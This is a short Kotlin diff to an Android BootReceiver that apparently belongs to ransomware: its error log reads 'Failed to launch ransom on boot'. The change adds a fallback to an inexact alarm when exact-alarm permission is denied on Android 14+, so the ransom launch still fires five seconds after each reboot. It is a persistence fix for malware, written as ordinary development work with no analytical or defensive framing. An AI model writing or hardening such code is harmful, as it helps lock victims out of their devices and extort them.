@@ -52,11 +52,20 @@ class BootReceiver : BroadcastReceiver() {
                     android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                 )
                 val am = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
-                am.setExactAndAllowWhileIdle(
-                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    android.os.SystemClock.elapsedRealtime() + 5000,
-                    pi
-                )
+                try {
+                    am.setExactAndAllowWhileIdle(
+                        android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        android.os.SystemClock.elapsedRealtime() + 5000,
+                        pi
+                    )
+                } catch (e: SecurityException) {
+                    // SCHEDULE_EXACT_ALARM not granted on Android 14+ — use inexact
+                    am.setAndAllowWhileIdle(
+                        android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        android.os.SystemClock.elapsedRealtime() + 5000,
+                        pi
+                    )
+                }
             }
         } catch (e: Exception) {
             Log.e(tag, "Failed to launch ransom on boot", e)
